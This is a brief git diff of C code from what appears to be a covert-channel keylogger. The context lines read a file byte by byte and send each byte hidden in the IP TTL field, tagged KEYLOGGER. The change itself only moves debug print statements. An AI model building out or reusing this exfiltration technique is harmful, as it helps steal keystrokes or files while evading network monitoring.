@@ -63,7 +63,7 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
 
     while((input = fgetc(file)) != EOF) {
         if(tcp){
-            //printf("Sending: %c\n", input);
+            printf("Sending: %c\n", input);
             covert_send(sip, dip, sport, dport, (unsigned char *) &input, KEYLOGGER); //send the packet
         } else {
             covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 1);
@@ -250,8 +250,6 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
         packet.ip.id = EOT_KEY;
         packet.ip.tos = EOT_KEY;
     }
-    printf("Sending: %c\n",data[0]);
-    printf("Sending: %c\n",packet.ip.id);
     packet.ip.ttl = data[0];
 
     packet.ip.frag_off = 0;
